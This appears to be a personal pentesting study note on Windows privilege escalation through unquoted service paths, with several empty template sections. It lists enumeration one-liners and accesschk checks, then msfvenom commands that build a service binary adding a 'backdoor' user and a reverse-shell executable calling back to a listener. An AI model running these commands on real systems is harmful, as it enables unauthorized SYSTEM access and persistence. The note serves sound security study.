#### Tags: [[06 - Privilege Escalation (TA0004)]] 

## Overview 

```markdown
```
## Enumeration 

### Automated

```markdown
```

### Manual
```
PS:> 
Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne "Disabled" -and $_.StartName -eq "LocalSystem" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Format-List

CMD:> 
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

```markdown
# Identfy service with weak permissions or unquoted paths
CMD> .\accesschk64.exe /accepteula -uwcqv studentuser ***

# Manually Query Service 
CMD:> sc qc "service_name"
PS:> cmd /c sc qc "BOOTP Turbo"

# AccessCHK - Sysinternals
## Check Write access to Directory under Unquoted Service PATH
C:\PrivEsc\accesschk.exe /accepteula -wuqvd "C:\Program Files\Unquoted Path Service\"
RW BUILTIN\Users
	FILE_ALL_ACCESS
# ICACLS - Inbuilt binary

```
![[Pasted image 20240330234249.png]]
## Exploitation 

```markdown
# Add User Exploiation
msfvenom -p windows/adduser USER=backdoor PASS=backdoor -f exe > service.exe

# Reverse Shell Exploitation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```
### Start the service post modification of PATH
- Restart Service
	- `net stop <service>`
	- `net start <service>`
- Restart Machine

## Resources

```markdown
```

#### Notes | Bonus
- Create Links to this Page! 
